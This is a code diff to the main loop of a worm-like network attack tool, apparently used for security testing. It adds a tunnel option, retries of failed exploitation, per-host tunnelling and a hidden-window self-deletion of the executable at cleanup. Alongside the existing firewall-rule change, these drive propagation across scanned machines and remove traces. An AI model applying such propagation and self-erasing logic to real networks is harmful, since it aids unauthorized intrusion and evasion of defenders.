@@ -1,5 +1,5 @@
-
 import sys
+import os
 import time
 import logging
 import platform
@@ -9,7 +9,9 @@ from control import ControlClient
 from config import WormConfiguration, EXTERNAL_CONFIG_FILE
 from network.network_scanner import NetworkScanner
 import tunnel
-import getopt
+import argparse
+import subprocess
+from model import DELAY_DELETE_CMD
 
 __author__ = 'itamar'
 
@@ -31,6 +33,7 @@ class ChaosMonkey(object):
         self._fail_exploitation_machines = set()
         self._singleton = SystemSingleton()
         self._parent = None
+        self._default_tunnel = None
         self._args = args
 
     def initialize(self):
@@ -39,12 +42,13 @@ class ChaosMonkey(object):
         if not self._singleton.try_lock():
             raise Exception("Another instance of the monkey is already running")
 
-        opts, self._args = getopt.getopt(self._args, "p:", ["parent="])
-        for op, val in opts:
-            if op in ("-p", "--parent"):
-                self._parent = val
-                break
-
+        arg_parser = argparse.ArgumentParser()
+        arg_parser.add_argument('-p', '--parent')
+        arg_parser.add_argument('-t', '--tunnel')
+        opts, self._args = arg_parser.parse_known_args(self._args)
+        
+        self._parent = opts.parent
+        self._default_tunnel = opts.tunnel
         self._keep_running = True
         self._network = NetworkScanner()
         self._dropper_path = sys.argv[0]
@@ -56,7 +60,7 @@ class ChaosMonkey(object):
         if firewall.is_enabled():
             firewall.add_firewall_rule()
 
-        ControlClient.wakeup(self._parent)
+        ControlClient.wakeup(parent=self._parent, default_tunnel=self._default_tunnel)
         
         monkey_tunnel = ControlClient.create_control_tunnel()
         if monkey_tunnel:
@@ -93,11 +97,19 @@ class ChaosMonkey(object):
                               machine)
                     continue
                 elif machine in self._fail_exploitation_machines:
-                    LOG.debug("Skipping %r - exploitation failed before",
-                              machine)
-                    continue
+                    if WormConfiguration.retry_failed_explotation:
+                        LOG.debug("%r - exploitation failed before, trying again",
+                                 machine)
+                    else:
+                        LOG.debug("Skipping %r - exploitation failed before",
+                                 machine)
+                        continue
 
                 successful_exploiter = None
+
+                if monkey_tunnel:
+                    monkey_tunnel.set_tunnel_for_host(machine)
+
                 for exploiter in self._exploiters:
                     if not exploiter.is_os_supported(machine):
                         LOG.info("Skipping exploiter %s host:%r, os is not supported",
@@ -139,8 +151,10 @@ class ChaosMonkey(object):
 
             time.sleep(WormConfiguration.timeout_between_iterations)
 
-        if self._keep_running:
+        if self._keep_running and WormConfiguration.alive:
             LOG.info("Reached max iterations (%d)", WormConfiguration.max_iterations)
+        elif not WormConfiguration.alive:
+            LOG.info("Marked not alive from configuration")
 
         if monkey_tunnel:
             monkey_tunnel.stop()
@@ -157,3 +171,18 @@ class ChaosMonkey(object):
             tunnel.quit_tunnel(tunnel_address)
 
         firewall.close()
+
+        if WormConfiguration.self_delete_in_cleanup and -1 == sys.executable.find('python'):
+            try:
+                if "win32" == sys.platform:
+                    from _subprocess import SW_HIDE, STARTF_USESHOWWINDOW, CREATE_NEW_CONSOLE
+                    startupinfo = subprocess.STARTUPINFO()
+                    startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
+                    startupinfo.wShowWindow = SW_HIDE                    
+                    subprocess.Popen(DELAY_DELETE_CMD % {'file_path' : sys.executable}, 
+                                     stdin=None, stdout=None, stderr=None, 
+                                     close_fds=True, startupinfo=startupinfo)
+                else:
+                    os.remove(sys.executable)
+            except Exception, exc:
+                LOG.error("Exception in self delete: %s",exc)
